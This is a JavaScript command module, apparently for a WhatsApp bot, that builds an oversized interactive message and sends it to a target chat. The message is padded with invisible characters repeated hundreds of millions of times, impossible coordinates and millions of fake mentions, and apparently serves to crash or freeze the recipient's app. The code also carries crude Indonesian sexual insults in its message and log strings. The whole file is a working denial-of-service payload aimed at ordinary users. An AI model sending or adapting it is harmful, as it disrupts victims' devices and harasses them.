module.exports = {
    name: `god',
    execute:async function SpermLengket(sock, jid) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u2063",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 99999999999,
                degreesLongitude: -999899999999,
                name: "\u2063".repeat(99998999),
                address: "\u2063".repeat(999979999)
              }
            },
            body: {
              text: "\u2063"
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: Array(9999999).fill("0@s.whatsapp.net"),
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "Mak Kamu Sexy[ # ]",
                        format: "DEFAULT"
                      },
                      version: 999999
                    }
                  }
                }
              }
            },
            interactiveResponseMessage: {
              body: {
                text: "Mak Kamu Sexy[ # ]",
                format: "DEFAULT"
              },
              version: 9998888
            }
          }
        }
      }
    };

    await sock.relayMessage(jid, msg, {
      messageId: undefined,
      participant: { jid }
    });

    console.log("✅ Kirim Sperma Berhasil Ke:", jid);
  } catch (err) {
    console.error("❌ Gagal kirim kontol:", err.message);
  }
}
